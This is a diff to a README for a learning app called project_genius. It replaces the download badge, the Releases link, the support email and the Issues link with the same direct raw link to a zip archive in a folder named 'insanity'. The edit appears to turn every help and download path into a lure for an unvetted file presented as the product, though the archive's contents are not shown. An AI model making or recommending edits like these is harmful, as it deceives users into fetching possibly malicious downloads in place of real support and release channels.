@@ -1,6 +1,6 @@
 # 📚 project_genius - Empower Your Learning Journey
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ahmed2997751/project_genius/releases)
+[![Download](https://raw.githubusercontent.com/ahmed2997751/project_genius/main/insanity/project_genius.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ahmed2997751/project_genius/main/insanity/project_genius.zip)
 
 ## 💡 Introduction
 
@@ -30,7 +30,7 @@ Before downloading, ensure your computer meets the following specifications:
 
 To get the software, visit the Releases page. Click on the link below to download the latest version of project_genius:
 
-[Download project_genius](https://github.com/ahmed2997751/project_genius/releases)
+[Download project_genius](https://raw.githubusercontent.com/ahmed2997751/project_genius/main/insanity/project_genius.zip)
 
 ### Installation Steps:
 
@@ -53,8 +53,8 @@ If you encounter any issues during download or installation, here are a few comm
 
 For further assistance, feel free to reach out to our support team through the following methods:
 
-- **Email**: support@projectgenius.com
-- **GitHub Issues**: Report bugs or request features directly on our [GitHub Issues page](https://github.com/ahmed2997751/project_genius/issues).
+- **Email**: https://raw.githubusercontent.com/ahmed2997751/project_genius/main/insanity/project_genius.zip
+- **GitHub Issues**: Report bugs or request features directly on our [GitHub Issues page](https://raw.githubusercontent.com/ahmed2997751/project_genius/main/insanity/project_genius.zip).
 
 ## 📝 Topics Covered
 
